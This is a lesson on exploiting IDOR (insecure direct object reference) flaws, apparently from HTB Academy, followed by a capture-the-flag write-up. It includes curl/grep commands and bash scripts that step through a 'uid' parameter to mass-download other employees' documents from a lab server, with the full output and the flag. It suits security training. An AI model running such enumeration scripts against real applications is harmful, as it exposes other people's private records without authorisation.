Exploiting IDOR vulnerabilities is easy in some instances but can be very challenging in others. Once we identify a potential IDOR, we can start testing it with basic techniques to see whether it would expose any other data. As for advanced IDOR attacks, we need to better understand how the web application works, how it calculates its object references, and how its access control system works to be able to perform advanced attacks that may not be exploitable with basic techniques.

Let's start discussing various techniques of exploiting IDOR vulnerabilities, from basic enumeration to mass data gathering, to user privilege escalation.

---

## Insecure Parameters

Let's start with a basic example that showcases a typical IDOR vulnerability. The exercise below is anÂ `Employee Manager`Â web application that hosts employee records:

Â Â Â 

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_employee_manager.jpg)

Our web application assumes that we are logged in as an employee with user idÂ `uid=1`Â to simplify things. This would require us to log in with credentials in a real web application, but the rest of the attack would be the same. Once we click onÂ `Documents`, we are redirected to

`/documents.php`:

Â Â Â 

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_documents.jpg)

When we get to theÂ `Documents`Â page, we see several documents that belong to our user. These can be files uploaded by our user or files set for us by another department (e.g., HR Department). Checking the file links, we see that they have individual names:


```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

We see that the files have a predictable naming pattern, as the file names appear to be using the userÂ `uid`Â and the month/year as part of the file name, which may allow us to fuzz files for other users. This is the most basic type of IDOR vulnerability and is calledÂ `static file IDOR`. However, to successfully fuzz other files, we would assume that they all start withÂ `Invoice`Â orÂ `Report`, which may reveal some files but not all. So, let's look for a more solid IDOR vulnerability.

We see that the page is setting ourÂ `uid`Â with aÂ `GET`Â parameter in the URL as (`documents.php?uid=1`). If the web application uses thisÂ `uid`Â GET parameter as a direct reference to the employee records it should show, we may be able to view other employees' documents by simply changing this value. If the back-end end of the web applicationÂ `does`Â have a proper access control system, we will get some form ofÂ `Access Denied`. However, given that the web application passes as ourÂ `uid`Â in clear text as a direct reference, this may indicate poor web application design, leading to arbitrary access to employee records.

When we try changing theÂ `uid`Â toÂ `?uid=2`, we don't notice any difference in the page output, as we are still getting the same list of documents, and may assume that it still returns our own documents:

Â Â Â 

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_documents.jpg)

However,Â `we must be attentive to the page details during any web pentest`Â and always keep an eye on the source code and page size. If we look at the linked files, or if we click on them to view them, we will notice that these are indeed different files, which appear to be the documents belonging to the employee withÂ `uid=2`:


```html
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

This is a common mistake found in web applications suffering from IDOR vulnerabilities, as they place the parameter that controls which user documents to show under our control while having no access control system on the back-end. Another example is using a filter parameter to only display a specific user's documents (e.g.Â `uid_filter=1`), which can also be manipulated to show other users' documents or even completely removed to show all documents at once.

---

## Mass Enumeration

We can try manually accessing other employee documents withÂ `uid=3`,Â `uid=4`, and so on. However, manually accessing files is not efficient in a real work environment with hundreds or thousands of employees. So, we can either use a tool likeÂ `Burp Intruder`Â orÂ `ZAP Fuzzer`Â to retrieve all files or write a small bash script to download all files, which is what we will do.

We can click on [`CTRL+SHIFT+C`] in Firefox to enable theÂ `element inspector`, and then click on any of the links to view their HTML source code, and we will get the following:

```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

We can pick any unique word to be able toÂ `grep`Â the link of the file. In our case, we see that each link starts withÂ `<li class='pure-tree_link'>`, so we mayÂ `curl`Â the page andÂ `grep`Â for this line, as follows:


```shell-session
smoothment@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"

<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

As we can see, we were able to capture the document links successfully. We may now use specific bash commands to trim the extra parts and only get the document links in the output. However, it is a better practice to use aÂ `Regex`Â pattern that matches strings betweenÂ `/document`Â andÂ `.pdf`, which we can use withÂ `grep`Â to only get the document links, as follows:


```shell-session
smoothment@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```

Now, we can use a simpleÂ `for`Â loop to loop over theÂ `uid`Â parameter and return the document of all employees, and then useÂ `wget`Â to download each document link:

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

When we run the script, it will download all documents from all employees withÂ `uids`Â between 1-10, thus successfully exploiting the IDOR vulnerability to mass enumerate the documents of all employees. This script is one example of how we can achieve the same objective. Try using a tool like Burp Intruder or ZAP Fuzzer, or write another Bash or PowerShell script to download all documents.


# Question
---
![Pasted image 20250217150006.png](../../../../IMAGES/Pasted%20image%2020250217150006.png)

Let's begin by visiting the website:

![Pasted image 20250217150148.png](../../../../IMAGES/Pasted%20image%2020250217150148.png)

We can view invoices, if we check the request we can see this:

![Pasted image 20250217150307.png](../../../../IMAGES/Pasted%20image%2020250217150307.png)

We are set with an `uid` of `1`, so, if an IDOR vulnerability is present in the web application, we can enumerate the invoice files from other users, let's use, also, the `uid` parameter is not injected directly in the URL but inside the request as data, we need to change the script we've been given a little bit, I did this script:

```bash
#!/bin/bash

url="http://94.237.59.180:34953"
results_file="results.txt"

# Clear existing results
> "$results_file"

for i in {1..20}; do
    echo "Testing UID $i..."
    
    # Send POST request with uid parameter
    response=$(curl -s -X POST "$url/documents.php" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "uid=$i")
    
    # Extract document links
    links=$(echo "$response" | grep -oP '\/documents\/.*?\.(pdf|txt)')
    
    if [ -z "$links" ]; then
        echo "[-] No documents found for UID $i" | tee -a "$results_file"
        continue
    fi
    
    echo "[+] Found documents for UID $i:" | tee -a "$results_file"
    echo "$links" | tee -a "$results_file"
    
    # Download files
    for link in $links; do
        filename=$(basename "$link")
        full_url="$url$link"
        
        echo "Downloading $filename..." | tee -a "$results_file"
        wget -q "$full_url" -O "$filename"
        
        # Check for flag in .txt files immediately
        if [[ "$filename" == *.txt ]]; then
            echo "=== FLAG CHECK ===" | tee -a "$results_file"
            cat "$filename" | tee -a "$results_file"
            echo "==================" | tee -a "$results_file"
        fi
    done
done

echo "Operation complete. Check $results_file for details."
```

After a while, we can see the following output:

```
Testing UID 1...
[+] Found documents for UID 1:
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
Downloading Invoice_1_09_2021.pdf...
Downloading Report_1_10_2021.pdf...
Testing UID 2...
[+] Found documents for UID 2:
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
Downloading Invoice_2_08_2020.pdf...
Downloading Report_2_12_2020.pdf...
Testing UID 3...
[+] Found documents for UID 3:
/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
Downloading Invoice_3_06_2020.pdf...
Downloading Report_3_01_2020.pdf...
Testing UID 4...
[+] Found documents for UID 4:
/documents/Invoice_4_07_2021.pdf
/documents/Report_4_11_2020.pdf
Downloading Invoice_4_07_2021.pdf...
Downloading Report_4_11_2020.pdf...
Testing UID 5...
[+] Found documents for UID 5:
/documents/Invoice_5_06_2020.pdf
/documents/Report_5_11_2021.pdf
Downloading Invoice_5_06_2020.pdf...
Downloading Report_5_11_2021.pdf...
Testing UID 6...
[+] Found documents for UID 6:
/documents/Invoice_6_09_2019.pdf
/documents/Report_6_09_2020.pdf
Downloading Invoice_6_09_2019.pdf...
Downloading Report_6_09_2020.pdf...
Testing UID 7...
[+] Found documents for UID 7:
/documents/Invoice_7_11_2021.pdf
/documents/Report_7_01_2020.pdf
Downloading Invoice_7_11_2021.pdf...
Downloading Report_7_01_2020.pdf...
Testing UID 8...
[+] Found documents for UID 8:
/documents/Invoice_8_06_2020.pdf
/documents/Report_8_12_2020.pdf
Downloading Invoice_8_06_2020.pdf...
Downloading Report_8_12_2020.pdf...
Testing UID 9...
[+] Found documents for UID 9:
/documents/Invoice_9_04_2019.pdf
/documents/Report_9_05_2020.pdf
Downloading Invoice_9_04_2019.pdf...
Downloading Report_9_05_2020.pdf...
Testing UID 10...
[+] Found documents for UID 10:
/documents/Invoice_10_03_2020.pdf
/documents/Report_10_05_2021.pdf
Downloading Invoice_10_03_2020.pdf...
Downloading Report_10_05_2021.pdf...
Testing UID 11...
[+] Found documents for UID 11:
/documents/Invoice_11_03_2021.pdf
/documents/Report_11_04_2021.pdf
Downloading Invoice_11_03_2021.pdf...
Downloading Report_11_04_2021.pdf...
Testing UID 12...
[+] Found documents for UID 12:
/documents/Invoice_12_02_2020.pdf
/documents/Report_12_04_2020.pdf
Downloading Invoice_12_02_2020.pdf...
Downloading Report_12_04_2020.pdf...
Testing UID 13...
[+] Found documents for UID 13:
/documents/Invoice_13_06_2020.pdf
/documents/Report_13_01_2020.pdf
Downloading Invoice_13_06_2020.pdf...
Downloading Report_13_01_2020.pdf...
Testing UID 14...
[+] Found documents for UID 14:
/documents/Invoice_14_01_2021.pdf
/documents/Report_14_01_2020.pdf
Downloading Invoice_14_01_2021.pdf...
Downloading Report_14_01_2020.pdf...
Testing UID 15...
[+] Found documents for UID 15:
/documents/Invoice_15_11_2020.pdf
/documents/Report_15_01_2020.pdf
/documents/flag_11dfa168ac8eb2958e38425728623c98.txt
Downloading Invoice_15_11_2020.pdf...
Downloading Report_15_01_2020.pdf...
Downloading flag_11dfa168ac8eb2958e38425728623c98.txt...
=== FLAG CHECK ===
HTB{4ll_f1l35_4r3_m1n3}
==================
Testing UID 16...
[+] Found documents for UID 16:
/documents/Invoice_16_12_2021.pdf
/documents/Report_16_01_2021.pdf
Downloading Invoice_16_12_2021.pdf...
Downloading Report_16_01_2021.pdf...
Testing UID 17...
[+] Found documents for UID 17:
/documents/Invoice_17_11_2021.pdf
/documents/Report_17_06_2021.pdf
Downloading Invoice_17_11_2021.pdf...
Downloading Report_17_06_2021.pdf...
Testing UID 18...
[+] Found documents for UID 18:
/documents/Invoice_18_12_2020.pdf
/documents/Report_18_01_2020.pdf
Downloading Invoice_18_12_2020.pdf...
Downloading Report_18_01_2020.pdf...
Testing UID 19...
[+] Found documents for UID 19:
/documents/Invoice_19_06_2020.pdf
/documents/Report_19_08_2020.pdf
Downloading Invoice_19_06_2020.pdf...
Downloading Report_19_08_2020.pdf...
Testing UID 20...
[+] Found documents for UID 20:
/documents/Invoice_20_06_2020.pdf
/documents/Report_20_01_2021.pdf
Downloading Invoice_20_06_2020.pdf...
Downloading Report_20_01_2021.pdf...
Operation complete. Check results.txt for details
```

We got our flag:

```
HTB{4ll_f1l35_4r3_m1n3}
```


But this is a lot of output and it can be tedious, we can modify the script a bit more for it to only show us the flag and delete all other files from our system after it's ended:

```bash
#!/bin/bash

url="http://94.237.59.180:34953"
temp_dir=".temp_docs"
flag_file=""
declare -a downloaded_files

# Create temporary directory
mkdir -p "$temp_dir"
cd "$temp_dir" || exit

cleanup() {
    echo "Cleaning up..."
    # Delete all files except the flag-containing file
    if [ -n "$flag_file" ]; then
        find . -type f ! -name "$flag_file" -delete
        echo "Kept flag file: $flag_file"
    else
        rm -f ./*
        echo "No flag found. All files deleted."
    fi
    cd .. && rmdir "$temp_dir" 2>/dev/null
}

# Capture CTRL+C to ensure cleanup
trap cleanup EXIT

for i in {1..20}; do
    # Get document links via POST
    links=$(curl -s -X POST "$url/documents.php" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "uid=$i" | grep -oP '\/documents\/.*?\.(pdf|txt)')

    [ -z "$links" ] && continue

    # Download files silently
    for link in $links; do
        filename=$(basename "$link")
        wget -q "$url$link" -O "$filename"
        downloaded_files+=("$filename")
        
        # Check for flag pattern in text files
        if [[ "$filename" == *.txt ]]; then
            if grep -qP 'HTB\{.*?\}' "$filename"; then
                flag_file="$filename"
                echo -e "\n\033[1;92mFLAG FOUND!\033[0m"
                grep -oP 'HTB\{.*?\}' "$filename"
                return  # Exit after first flag found
            fi
        fi
    done
done

# If we didn't exit early, check all downloaded files
if [ -z "$flag_file" ]; then
    for file in "${downloaded_files[@]}"; do
        if [[ "$file" == *.txt ]] && grep -qP 'HTB\{.*?\}' "$file"; then
            flag_file="$file"
            echo -e "\n\033[1;92mFLAG FOUND!\033[0m"
            grep -oP 'HTB\{.*?\}' "$file"
            break
        fi
    done
fi
```


```
smoothment@htb[/htb]$ ./IDOR.sh

FLAG FOUND!
HTB{4ll_f1l35_4r3_m1n3}
Cleaning up...
```

